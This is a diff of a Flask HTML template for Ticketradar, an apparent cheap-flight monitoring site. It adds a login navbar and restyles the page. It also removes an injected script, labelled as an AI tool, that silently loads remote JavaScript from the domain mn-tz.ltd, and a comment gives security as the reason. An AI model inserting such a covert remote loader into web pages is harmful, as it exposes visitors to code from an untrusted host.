@@ -26,23 +26,63 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}?v=9">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}?v=10">
 
-    <!-- AI工具脚本 -->
-    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-      (function () {
-          var script = document.createElement("script");
-          script.async = 1;
-          script.src = 'https://mn-tz.ltd/NDE1NzE1.js?t=415715';
-          document.head.appendChild(script);
-      })();
-    </script>
+    <!-- 移除了第三方AI工具脚本以提高安全性 -->
 </head>
 <body>
+    <!-- 顶部导航栏 -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
+        <div class="container">
+            <a class="navbar-brand fw-bold" href="{{ url_for('index') }}">
+                <i class="bi bi-airplane text-primary me-2"></i>
+                <span class="text-primary">Ticketradar</span>
+            </a>
+
+            <div class="navbar-nav ms-auto">
+                {% if current_user and current_user.is_authenticated %}
+                    <div class="dropdown">
+                        <button class="btn btn-outline-primary dropdown-toggle d-flex align-items-center" type="button" data-bs-toggle="dropdown">
+                            <i class="bi bi-person-circle me-2"></i>
+                            <span>{{ current_user.username }}</span>
+                        </button>
+                        <ul class="dropdown-menu dropdown-menu-end">
+                            <li><a class="dropdown-item" href="{{ url_for('dashboard') }}">
+                                <i class="bi bi-speedometer2 me-2"></i>我的监控
+                            </a></li>
+                            {% if current_user.is_admin %}
+                            <li><a class="dropdown-item" href="{{ url_for('admin') }}">
+                                <i class="bi bi-gear me-2"></i>管理后台
+                            </a></li>
+                            {% endif %}
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item text-danger" href="{{ url_for('logout') }}">
+                                <i class="bi bi-box-arrow-right me-2"></i>退出登录
+                            </a></li>
+                        </ul>
+                    </div>
+                {% else %}
+                    <div class="d-flex gap-2">
+                        <a href="{{ url_for('login') }}" class="btn btn-outline-primary">
+                            <i class="bi bi-box-arrow-in-right me-1"></i>登录
+                        </a>
+                        <a href="{{ url_for('register') }}" class="btn btn-primary">
+                            <i class="bi bi-person-plus me-1"></i>注册
+                        </a>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </nav>
+
     <div class="container">
-        <header class="py-4 text-center">
-            <h1 class="display-4">Ticketradar</h1>
-            <p class="lead">实时监控低价机票，助您找到最佳出行选择</p>
+        <header class="py-1 text-center">
+            <div class="hero-section">
+                <h1 class="display-5 fw-bold text-primary mb-1">
+                    <i class="bi bi-airplane me-2"></i>Ticketradar
+                </h1>
+                <p class="lead text-muted fs-6">实时监控低价机票，助您找到最佳出行选择</p>
+            </div>
 
             <!-- 行程信息卡片 -->
             <div class="trip-info-card">
@@ -92,7 +132,7 @@
                 </div>
             </div>
 
-            <div class="last-update mt-3">
+            <div class="last-update mt-2">
                 <i class="bi bi-clock"></i> 最后更新时间: {{ last_update }}
                 <button class="btn btn-sm btn-outline-primary ms-3" onclick="window.location.reload();">
                     <i class="bi bi-arrow-clockwise"></i> 刷新
@@ -198,7 +238,7 @@
                             <div class="alert alert-warning py-2">
                                 <i class="bi bi-exclamation-triangle-fill me-2"></i><strong>请先截屏保存二维码</strong>，再点击下方绿色按钮
                             </div>
-                            <p class="text-success mt-2"><i class="bi bi-check-circle"></i> 无需实名认证，完全免费</p>
+                            <p class="text-primary mt-2"><i class="bi bi-check-circle"></i> 无需实名认证，完全免费</p>
                         </div>
                     </div>
                     <div class="modal-footer justify-content-between border-0 pt-0">
@@ -241,7 +281,7 @@
                 <div class="row row-cols-1 row-cols-md-2 row-cols-lg-3 g-4">
                     {% for flight in flights %}
                     <div class="col">
-                        <div class="card h-100 destination-card {% if flight.价格 < settings.price_threshold %}border-success{% endif %}">
+                        <div class="card h-100 destination-card {% if flight.价格 < settings.price_threshold %}border-primary{% endif %}">
                             <div class="destination-image-container">
                                 <img src="{{ flight.图片链接 }}" class="card-img-top destination-image" alt="{{ flight.目的地 }}">
                                 <div class="destination-overlay">
@@ -254,7 +294,7 @@
                             <div class="card-body">
                                 <div class="d-flex justify-content-between align-items-start mb-2">
                                     <h5 class="card-title mb-0">{{ flight.目的地 }} <small class="text-muted">({{ flight.代码 }})</small></h5>
-                                    <span class="price-tag {% if flight.价格 < settings.price_threshold %}text-success{% endif %}">
+                                    <span class="price-tag {% if flight.价格 < settings.price_threshold %}text-primary{% endif %}">
                                         {{ flight.价格 }} {{ flight.货币 }}
                                     </span>
                                 </div>
@@ -321,6 +361,9 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- API配置 -->
+    <script src="{{ url_for('static', filename='js/api-config.js') }}"></script>
 
     <!-- Flask模板变量 -->
     <script type="text/javascript">
